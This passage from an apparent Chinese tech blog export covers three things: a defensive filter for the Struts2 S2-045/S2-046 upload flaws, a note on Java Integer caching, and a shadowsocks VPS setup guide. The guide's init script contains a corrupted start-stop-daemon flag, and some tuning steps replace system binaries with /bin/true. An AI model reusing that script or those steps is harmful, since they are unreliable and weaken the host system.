class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml配置参考：新增的filter需要在原有struts filter之前</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Struts 2 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.strutsfilter.Struts2Filter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>content-type-param<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>application/octet-stream,application/pdf,application/vnd.android.package-archive,</span><br><span class="line">    application/vnd.rn-realmedia-vbr,application/x-bmp,application/x-img,application/x-javascript,</span><br><span class="line">    application/x-jpe,application/x-jpg,application/x-png,application/x-shockwave-flash,</span><br><span class="line">    application/x-x509-ca-cert,application/x-xls,audio/mp3,image/gif,image/jpeg,image/png,</span><br><span class="line">    image/x-icon,image/rfc822,text/css,text/html,text/plain,text/xml,video/mpg,video/mpeg4,video/mpg,</span><br><span class="line">    video/x-ms-wmv,application/x-www-form-urlencoded,multipart/form-data<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正好项目中有spring，调用了spring web的MultipartResolver，对request进行wrap。这步避免了s2-045漏洞。再补上检查filename部分就行了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MultipartResolver resolver = <span class="keyword">new</span> CommonsMultipartResolver(reqWrapper.getSession().getServletContext());</span><br><span class="line"></span><br><span class="line">MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request);</span><br><span class="line">    <span class="comment">// 这步将调用到common-fileupload.jar的FileUploadBase.java的FileItemIteratorImpl内部类进行下列判断 if ((null == contentType)|| (!contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/")))。所以，也可以直接在后续补上这段操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查s2-046</span></span><br><span class="line">Map&lt;String,MultipartFile&gt; fileMap = multipartRequest.getFileMap();</span><br><span class="line">Collection&lt;MultipartFile&gt; col = fileMap.values();</span><br><span class="line">Iterator&lt;MultipartFile&gt; itr = col.iterator();</span><br><span class="line">MultipartFile file = <span class="keyword">null</span>;</span><br><span class="line">String fileName = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">while</span>(itr.hasNext())&#123;</span><br><span class="line">    file = itr.next();</span><br><span class="line">    file.getName();   <span class="comment">// 这部分实际上调用到的fieldName，不是文件名</span></span><br><span class="line">    fileName = file.getOriginalFilename();</span><br><span class="line">    <span class="comment">//这步将调用Streams.checkFileName()，检查文件名为NULL字符串的情况。也可以直接使用相关判断，文件名是否包含NULL字符串，OGNL字符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上检查fileName，调用到common-fileupload.jar的Streams.checkFileName()，也是可以的。</p><h3 id="改用其他解析"><a href="#改用其他解析" class="headerlink" title="改用其他解析"></a>改用其他解析</h3><p><a href="https://cwiki.apache.org/confluence/display/S2PLUGINS/Pell+Multipart+Plugin">改用pull</a></p><h3 id="升级到Apache-Struts-2-3-32或2-5-10-1版本。（强烈推荐）"><a href="#升级到Apache-Struts-2-3-32或2-5-10-1版本。（强烈推荐）" class="headerlink" title="升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）"></a>升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）</h3><p>如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）</p><p>针对Struts2的升级，可将原应用相关的依赖jar包替换为最新的Struts2包，其中，有三个包是必须要升级的：</p><ul><li>struts2-core-2.3.32.jar：Struts2核心包，也是此次漏洞发生的所在。</li><li>xwork-core-2.3.32.jar：Struts2依赖包，版本跟随Struts2一起更新。</li><li>ognl-3.0.19.jar：用于支持OGNL表达式，为其他包提供依赖。</li></ul><p>如果暂时不便升级，官方也已准备了两个可以作为应急使用的Jakarta插件版本，用户可以下载使用，<a href="https://github.com/apache/struts-extras">链接地址</a></p><p>补丁地址<br><a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32">Struts 2.3.32</a><br><a href="https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b">2.3.32补丁修复方案</a></p><p><a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1">Struts 2.5.10.1</a><br><a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a">2.5.10.1补丁修复方案</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>自动装包与拆包中需要注意的int Integer数据范围</title>
    <url>/2015/03/03/autoboxing-and-unboxing-int-Integer-precision-range/</url>
    <content><![CDATA[<p>在这里，区别一个概念“==”和equals（）<br>“==”是比较两个对象是不是引用自同一个对象<br>“equals（）”是比较两个对象的内容</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer data1 = <span class="number">500</span>;  </span><br><span class="line">Integer data2 = <span class="number">500</span>;  </span><br><span class="line">System.out.println(data1==data2);</span><br></pre></td></tr></table></figure><h2 id="128-127之间int可以自动拆包"><a href="#128-127之间int可以自动拆包" class="headerlink" title="-128-127之间int可以自动拆包"></a>-128-127之间int可以自动拆包</h2><p>自动装包时，对于值从-128-127之间的数(int)，被装包后，会被放在内存中进行重用，如果超出了这个值的范围就不会被重用的，所以每次new出来的Integer都是一个新的对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer i = <span class="keyword">null</span>;<span class="comment">//表明i没有参考至任何对象 </span></span><br><span class="line"><span class="keyword">int</span> j = i ;<span class="comment">//相当于 int j = i.intValue（）</span></span><br></pre></td></tr></table></figure><h2 id="Integer赋值为null，可以自动拆包"><a href="#Integer赋值为null，可以自动拆包" class="headerlink" title="Integer赋值为null，可以自动拆包"></a>Integer赋值为null，可以自动拆包</h2><p>编译时是可以通过的，因为它的语法是正确的，但在运行时，就会排除NullPointerException错误，这是由于i并没有参考至任何对象造成的</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>在VPS上搭建自己的ss服务端</title>
    <url>/2015/10/18/build-myself-ss-on-vps/</url>
    <content><![CDATA[<h2 id="乱谈在前"><a href="#乱谈在前" class="headerlink" title="乱谈在前"></a>乱谈在前</h2><p>搭建时使用的<a href="https://github.com/shadowsocks/shadowsocks-libev">shadowsocks-libev</a>。</p><p>该版本的特点是内存占用小（600k左右），低 CPU 消耗，甚至可以安装在基于 OpenWRT 的路由器上。</p><p>Go 版是二进制安装，无需编译，非常简单快捷。</p><p>Python版的Shadowsocks易部署，后期升级维护都非常方便，相当适合新手，支持的特性也最多，稳定性好，运行效率高。</p><p>而目前只有 Python 和 Go 版是支持在配置文件里直接设置多端口的，至于 libev 版则需要使用多个配置文件并开启多个实例才行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "server":"0.0.0.0",</span><br><span class="line">    "port_password":&#123;</span><br><span class="line">        "8388":"password1",</span><br><span class="line">        "8389":"password2",</span><br><span class="line">        "8390":"password3",</span><br><span class="line">        "8391":"password4"</span><br><span class="line">    &#125;,</span><br><span class="line">    "timeout":300,</span><br><span class="line">    "method":"aes-256-cfb"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所谓的多用户，其实就是把不同的端口给不同的人使用，每个端口则对应不同的密码。Python 和 Go 版通过简单的修改单一配置文件，然后重启程序即可。<br>自用的话，没必要使用多用户了。占用内存小的，满适合的。适合的，才是最好的。</p><p>Python版的Shadowsocks部署：<br><a href="http://shadowsocks.blogspot.com/2015/01/shadowsocks.html">史上最详尽Shadowsocks从零开始一站式FQ教程(G+)需FQ</a></p><p>网络上还有各种一键安装脚本，可以使用。</p><p>自用VPS<br>HK<br><a href="https://my.hostus.us/aff.php?aff=671&pid=183">1核CPU、256MB内存、256MB vSwap、10GB SSD硬盘、500GB/月流量,1Gbps端口、1个IPv4、4个IPv6 $25每年，可月付$2.95</a><br><a href="https://my.hostus.us/aff.php?aff=671&pid=179">1核CPU、512MB内存、512MB vSwap、15GB SSD硬盘、750GB/月流量,1Gbps端口、1个IPv4、4个IPv6 $35每年，可季付$10</a><br><a href="https://my.hostus.us/aff.php?aff=671&pid=180">2核CPU、768MB内存、768MB vSwap、30GB SSD硬盘、2TB/月流量,1Gbps端口、1个IPv4、4个IPv6 $48每年，可季付$15</a><br>US 洛杉矶&amp;亚特兰大&amp;达拉斯<br><a href="https://my.hostus.us/aff.php?aff=671&pid=103">HostUS US LEB OVZ Special - 768MB RAM - 2048 GB/月流量 $10每年</a></p><p>HK 一般没货 看到就抢吧<br><a href="https://my.hostus.us/aff.php?aff=671&pid=178">1核CPU、512MB内存、512MB vSwap、10GB SSD硬盘、750GB/月流量,1Gbps端口、1个IPv4、4个IPv6 $25每年</a><br><a href="https://my.hostus.us/aff.php?aff=671&pid=177">1核CPU、768MB内存、768MB vSwap、20GB SSD硬盘、2000GB/月流量,1Gbps端口、1个IPv4、4个IPv6 $35每年</a></p><p>搬瓦工便宜型号没货了</p><p><a href="https://wiki.archlinux.org/index.php/Shadowsocks_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">archlinux维基ss详细安装</a></p><h2 id="安装SHADOWSOCKS服务端"><a href="#安装SHADOWSOCKS服务端" class="headerlink" title="安装SHADOWSOCKS服务端"></a>安装SHADOWSOCKS服务端</h2><h3 id="CentOS："><a href="#CentOS：" class="headerlink" title="CentOS："></a>CentOS：</h3><p>使用CentOS，版本最好是CentOS 6.x 32或64位</p><ol><li>先安装必须的包：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y gcc automake autoconf libtool make build-essential autoconf libtool gcc</span><br><span class="line">yum install -y curl curl-devel zlib-devel openssl-devel perl perl-devel cpio expat-devel gettext-devel</span><br><span class="line">yum install -y git</span><br></pre></td></tr></table></figure><ol start="2"><li>然后通过git下载源码：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/madeye/shadowsocks-libev.git</span><br></pre></td></tr></table></figure><ol start="3"><li>从源码编译安装：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd shadowsocks-libev</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>同样在源码目录下，执行以下命令卸载</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make uninstall</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>其他Unix-like的系统，特别是Debian-based的Linux发行版如： Ubuntu, Debian or Linux Mint</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential autoconf libtool libssl-dev</span><br><span class="line">git clone https://github.com/madeye/shadowsocks-libev.git</span><br><span class="line">cd shadowsocks-libev</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="Ubuntu-Debian："><a href="#Ubuntu-Debian：" class="headerlink" title="Ubuntu/Debian："></a>Ubuntu/Debian：</h3><ol><li>先安装必须的包：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential autoconf libtool libssl-dev gawk debhelper git</span><br></pre></td></tr></table></figure><ol start="2"><li>然后通过git下载源码：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shadowsocks/shadowsocks-libev.git</span><br></pre></td></tr></table></figure><ol start="3"><li>然后生成deb包并安装，一步步执行（留意是否出错 如果出错需要检查系统或者之前的步骤）：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd shadowsocks-libev</span><br><span class="line">dpkg-buildpackage -us -uc</span><br><span class="line">cd ..</span><br><span class="line">dpkg -i shadowsocks-libev*.deb</span><br></pre></td></tr></table></figure><h3 id="直接从作者提供的软件源安装（Ubuntu-Debian）"><a href="#直接从作者提供的软件源安装（Ubuntu-Debian）" class="headerlink" title="直接从作者提供的软件源安装（Ubuntu/Debian）"></a>直接从作者提供的软件源安装（Ubuntu/Debian）</h3><p>由于作者更新源码后并不一定更新这些预编译的包，所以无法保证最新版本，但步骤比较简单。不推荐这种方式。</p><p>先添加GPG Key：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O- http://shadowsocks.org/debian/1D27208A.gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>Ubuntu 12.04 / Debian Wheezy以上版本(libssl 1.0.1以上)：</p><p>在/etc/apt/sources.list末尾添加：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://shadowsocks.org/debian wheezy main</span><br></pre></td></tr></table></figure><p>Ubuntu 11.04 / Debian Squeeze（libssl 0.9.8~1.0.0)：</p><p>在/etc/apt/sources.list末尾添加：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://shadowsocks.org/debian squeeze main</span><br></pre></td></tr></table></figure><p>最后安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install shadowsocks-libev</span><br></pre></td></tr></table></figure><h2 id="配置与启动"><a href="#配置与启动" class="headerlink" title="配置与启动"></a>配置与启动</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>配置文件为：/etc/shadowsocks-libev/config.json，格式说明：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 如果etc目录没有权限，需要命令解除限制</span></span><br><span class="line">restorecon -R -v /etc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果文件权限问题</span></span><br><span class="line">chattr -i config.json</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果etc下没有shadowsocks-libev目录</span></span><br><span class="line">mkdir shadowsocks-libev</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/shadowsocks-libev/config.json &lt;&lt; EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"> 也可以直接建立配置文件</span></span><br><span class="line">cat &lt;&lt; "EOF" &gt; /etc/shadowsocks.json</span><br><span class="line">&#123;</span><br><span class="line">    "server":"my_server_ip",</span><br><span class="line">    "server_port":8388,</span><br><span class="line">    "local_address": "127.0.0.1",</span><br><span class="line">    "local_port":1080,</span><br><span class="line">    "password":"mypassword",</span><br><span class="line">    "timeout":300,</span><br><span class="line">    "method":"aes-256-cfb",</span><br><span class="line">    "fast_open": false,</span><br><span class="line">    "workers": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server：主机域名或者IP地址，尽量填IP</span><br><span class="line">server_port：服务器监听端口</span><br><span class="line">password：密码</span><br><span class="line">method：加密方式 默认为table,其他有rc4,rc4-md5,aes-128-cfb, aes-192-cfb, aes-256-cfb,bf-cfb, camellia-128-cfb, camellia-192-cfb,camellia-256-cfb, cast5-cfb, des-cfb</span><br><span class="line">如果客户端有OpenWRT路由器等设备，或者路由器性能较弱，推荐rc4-md5，性能更好；否则可以选用安全性更好的aes-256-cfb等，虽然计算复杂度上升，会有性能的损失，不过对于PC机以及现在的智能手机来说没有任何问题。性能没多大损失。</span><br><span class="line"></span><br><span class="line">timeout：连接超时时间，单位秒。要适中。</span><br><span class="line">fast_open：	use [TCP_FASTOPEN](https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open), true / false</span><br><span class="line">workers：	number of workers, available on Unix/Linux</span><br></pre></td></tr></table></figure><p>注意引号。</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>Ubuntu/Debian 通过deb包安装的（deb包安装的默认会开启自启）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service shadowsocks-libev restart</span><br></pre></td></tr></table></figure><p>CentOS，拷贝启动脚本shadowsocks-libev到/etc/init.d/目录下后，启动：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d stop</span><br></pre></td></tr></table></figure><p>shadowsocks-libev脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; "EOF" &gt; /etc/init.d/</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">====================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Run level information:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig: 2345 99 99</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Description: lightweight secured scoks5 proxy</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> processname: ss-server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Run <span class="string">"/sbin/chkconfig --add shadowsocksd"</span> to add the Run levels.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">====================================================================</span></span><br><span class="line">NAME=shadowsocks</span><br><span class="line">PIDFILE=/var/run/$NAME.pid</span><br><span class="line">DAEMON=/usr/local/bin/ssserver</span><br><span class="line"><span class="meta">#</span><span class="bash"> DAEMON_OPTS=<span class="string">"-c /etc/shadowsocks.json"</span></span></span><br><span class="line">DAEMON_OPTS="-c /etc/shadowsocks-libev/config.json"</span><br><span class="line">start() &#123;</span><br><span class="line">    echo -n "Starting daemon: "$NAME</span><br><span class="line">    touch $PIDFILE</span><br><span class="line">    chown root:root $PIDFILE</span><br><span class="line">    start-stop-daemon --make-pidfile --bashadowsocks ckground --start --quiet --pidfile $PIDFILE  --chuid root:root --exec $DAEMON -- $DAEMON_OPTS || true</span><br><span class="line">    echo "."</span><br><span class="line">&#125;</span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -n "Stopping daemon: "$NAME</span><br><span class="line">    start-stop-daemon --stop --quiet --oknodo --pidfile $PIDFILE || true</span><br><span class="line">    echo "."</span><br><span class="line">&#125;</span><br><span class="line">case "$1" in</span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        echo -n "Restarting daemon: "$NAME</span><br><span class="line">        stop</span><br><span class="line">        sleep 1</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">    echo "Usage: "$1" &#123;start|stop|restart&#125;"</span><br><span class="line">    exit 1</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod u+x /etc/init.d/shadowsocksd</span><br><span class="line"><span class="meta">#</span><span class="bash"> update-rc.d shadowsocksd defaults</span></span><br><span class="line">启动：/etc/init.d/shadowsocksd start</span><br><span class="line">停止：/etc/init.d/shadowsocksd stop</span><br><span class="line">重启：/etc/init.d/shadowsocksd restart</span><br><span class="line">查看状态：/etc/init.d/shadowsocksd status</span><br></pre></td></tr></table></figure><p>需要开机自启的，可以建立符号连接到/etc/rc.d/SXXshadowsocks-libev<br>ln -s /etc/init.d/shadowsocksd /etc/rc.d/rc3.d/S100shadowsocksd<br>/sbin/chkconfig –add shadowsocksd<br>或者直接调用<a href="https://github.com/shadowsocks/shadowsocks-libev#usage">ss-server命令</a>运行，</p><p>直接使用下面的简单命令启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setsid ss-server -c /etc/shadowsocks-libev/config.json -u</span><br></pre></td></tr></table></figure><p>查看shadowsocks是否正确启动并监听相应端口，看到有ss-server进程LISTEN正确的端口就表示成功：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -lnp</span><br></pre></td></tr></table></figure><p>也可以用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep ss-server | grep -v ps | grep -v grep</span><br></pre></td></tr></table></figure><p>查看进程是否存在。</p><h2 id="升级-优化"><a href="#升级-优化" class="headerlink" title="升级/优化"></a>升级/优化</h2><h3 id="升级-卸载"><a href="#升级-卸载" class="headerlink" title="升级/卸载"></a>升级/卸载</h3><p>已安装旧版本的 shadowsocks 需要升级的话，需下载本脚本的最新版，运行卸载命令后，再次执行本脚本即可安装最新版。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./shadowsocks-libev.sh uninstall</span><br></pre></td></tr></table></figure><h3 id="GoAgent与Shadowsocks混合代理"><a href="#GoAgent与Shadowsocks混合代理" class="headerlink" title="GoAgent与Shadowsocks混合代理"></a>GoAgent与Shadowsocks混合代理</h3><p>Chrome+SwitchSharp实现GoAgent与Shadowsocks混合代理<br>在SwitchSharp的配置中新建情景模式，HTTP、FTP为未加密连接可填入Goagent的代理端口配置，而在SOCKS代理中填入Shadowsocks的端口号，如此一来，HTTPS就会自动走shadowsocks，未加密流量就会走goagent，从而不用导入GoAgent CA证书，解决某些强迫症患者的特殊需求。<br>不过使用此方法带来的问题就是HTTPS的降速，除非你有速度良好的国外VPS，因为大部分国外服务器代理速度都拼不过GAE的。<br><a href="https://cokebar.info/archives/191">原链接</a></p><h3 id="Shadowsocks优化方案"><a href="#Shadowsocks优化方案" class="headerlink" title="Shadowsocks优化方案:"></a>Shadowsocks优化方案:</h3><h4 id="搬瓦工优化方案"><a href="#搬瓦工优化方案" class="headerlink" title="搬瓦工优化方案:"></a>搬瓦工优化方案:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f /sbin/modprobe</span><br><span class="line">ln -s /bin/true /sbin/modprobe</span><br><span class="line">rm -f /sbin/sysctl</span><br><span class="line">ln -s /bin/true /sbin/sysctl</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加以下内容</span></span><br><span class="line">fs.file-max = 51200</span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 0</span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br><span class="line">net.ipv4.tcp_keepalive_time = 1200</span><br><span class="line">net.ipv4.ip_local_port_range = 10000 65000</span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 8192</span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 5000</span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line"><span class="meta">#</span><span class="bash"> increase TCP max buffer size settable using setsockopt()</span></span><br><span class="line">net.core.rmem_max = 67108864</span><br><span class="line">net.core.wmem_max = 67108864</span><br><span class="line"><span class="meta">#</span><span class="bash"> increase Linux autotuning TCP buffer <span class="built_in">limit</span></span></span><br><span class="line">net.ipv4.tcp_rmem = 4096 87380 67108864</span><br><span class="line">net.ipv4.tcp_wmem = 4096 65536 67108864</span><br><span class="line"><span class="meta">#</span><span class="bash"> increase the length of the processor input queue</span></span><br><span class="line">net.core.netdev_max_backlog = 250000</span><br><span class="line"><span class="meta">#</span><span class="bash"> recommended <span class="keyword">for</span> hosts with jumbo frames enabled</span></span><br><span class="line">net.ipv4.tcp_mtu_probing=1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加以上内容</span></span><br><span class="line"></span><br><span class="line">sysctl -p</span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启回来继续执行以下命令</span></span><br><span class="line">apt-get install libnet1</span><br><span class="line">apt-get install libpcap0.8</span><br><span class="line">apt-get install libnet1-dev</span><br><span class="line">apt-get install libpcap0.8-dev</span><br><span class="line">wget https://net-speeder.googlecode.com/files/net_speeder-v0.1.tar.gz</span><br><span class="line">tar zxvf net_speeder-v0.1.tar.gz</span><br><span class="line">sh ./net_speeder/build.sh -DCOOKED</span><br><span class="line">./net_speeder/net_speeder venet0 "tcp" &gt; netlog &amp;</span><br></pre></td></tr></table></figure><p>注意！</p><p>关于apt-get install libnet1报错..<br>先执行一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><p>更新完成再安装libnet1试试看..<br>我在搬瓦工上实测不会报错..<br>还有..如果是centos的话..是不能这样安装的..</p><p>安装<a href="https://github.com/snooda/net-speeder">Net_speeder</a><br>由于TCP的特性导致，每个包发一次，容易掉包。干脆就一个包发两次，有效降低掉包率。</p><p>debian/ubuntu安装libnet：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libnet1</span><br></pre></td></tr></table></figure><p>安装libpcap：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libpcap0.8</span><br></pre></td></tr></table></figure><p>编译需要安装libnet和libpcap对应的dev包<br>debian/ubuntu安装libnet-dev：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libnet1-dev</span><br></pre></td></tr></table></figure><p>安装libpcap-dev：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libpcap0.8-dev</span><br></pre></td></tr></table></figure><p>centos安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载epel：https://fedoraproject.org/wiki/EPEL/zh-cn</span><br><span class="line">例：CentOS6 64位：wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span><br><span class="line">如果是centos5，则在epel/5/下</span><br><span class="line">然后安装epel：rpm -ivh epel-release-X-Y.noarch.rpm</span><br><span class="line">然后即可使用yum安装：yum install libnet libpcap libnet-devel libpcap-devel</span><br><span class="line">下载net-speeder：wget https://net-speeder.googlecode.com/files/net_speeder-v0.1.tar.gz</span><br><span class="line">解压缩：tar -zxvf net_speeder-v0.1.tar.gz</span><br><span class="line">使用方法(需要root权限启动）：</span><br><span class="line">参数：./net_speeder 网卡名 加速规则（bpf规则）</span><br><span class="line">最简单用法： # ./net_speeder venet0 “ip” 加速所有ip协议数据</span><br></pre></td></tr></table></figure><h4 id="Do优化方案"><a href="#Do优化方案" class="headerlink" title="Do优化方案:"></a>Do优化方案:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/sysctl.d/local.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加以下内容</span></span><br><span class="line">fs.file-max = 51200</span><br><span class="line"></span><br><span class="line">net.core.rmem_max = 67108864</span><br><span class="line">net.core.wmem_max = 67108864</span><br><span class="line">net.core.rmem_default = 65536</span><br><span class="line">net.core.wmem_default = 65536</span><br><span class="line">net.core.netdev_max_backlog = 4096</span><br><span class="line">net.core.somaxconn = 4096</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 0</span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br><span class="line">net.ipv4.tcp_keepalive_time = 1200</span><br><span class="line">net.ipv4.ip_local_port_range = 10000 65000</span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 4096</span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 5000</span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line">net.ipv4.tcp_rmem = 4096 87380 67108864</span><br><span class="line">net.ipv4.tcp_wmem = 4096 65536 67108864</span><br><span class="line">net.ipv4.tcp_mtu_probing = 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> high-latency network</span></span><br><span class="line">net.ipv4.tcp_congestion_control = htcp #如果是do主机+debian7..可以使用hybla参数..其他vps主机如使用htcp报错请更换高版本内核或使用cubic参数</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> low-latency network, use cubic instead</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> net.ipv4.tcp_congestion_control = cubic</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加以上内容</span></span><br><span class="line"></span><br><span class="line">sysctl –system</span><br><span class="line">ulimit -n 51200</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>锐速(可选..且只能安装在DO主机上..搬瓦工不支持):</p><p>首先去 <a 